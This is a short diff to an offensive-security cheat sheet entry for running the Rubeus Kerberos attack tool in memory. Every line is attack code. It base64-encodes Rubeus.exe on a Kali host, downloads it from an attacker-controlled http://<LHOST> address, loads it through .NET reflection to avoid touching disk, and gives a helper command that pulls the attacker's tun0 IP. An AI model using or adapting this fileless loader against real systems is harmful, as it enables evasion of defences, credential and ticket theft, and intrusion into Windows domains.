@@ -1,9 +1,10 @@
 % rubeus
 
-# running in memory (sudo pwsh)
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("/opt/win/Rubeus.exe")) | Out-File -Encoding ASCII /opt/win/rubeus.txt # on kali
-$content = (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/win/rubeus.txt')
-$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+# running in memory
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("/opt/win/Rubeus.exe")) | Out-File -Encoding ASCII /opt/win/rubeus.txt # sudo pwsh on kali
+<VAR>content = (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/win/rubeus.txt')
+<VAR>RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("<RUBEUS_CMD>".Split())
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
+$ VAR: echo '$'
